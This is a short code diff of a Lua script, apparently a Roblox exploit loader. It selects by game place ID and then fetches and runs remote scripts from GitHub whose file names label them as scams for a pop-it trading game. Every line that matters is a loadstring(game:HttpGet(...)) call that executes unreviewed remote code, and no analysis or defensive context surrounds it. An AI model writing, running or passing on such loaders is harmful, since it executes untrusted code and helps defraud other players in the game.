@@ -1,4 +1,11 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Nadiehp/Nadiehp/refs/heads/main/%C2%BF(Scam)%3F"))()
+local placeId = game.PlaceId
+
+if placeId == 7346416636 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nadiehp/Nadiehp/refs/heads/main/%C2%BF(Scam)%3F"))()
 
 wait(0.2)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Nadiehp/Nadiehp/refs/heads/main/Numer"))()
+
+elseif placeId == 7503115095 then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nadiehp/Nadiehp/refs/heads/main/Comercio-de-pop-it-Scam"))()
+end
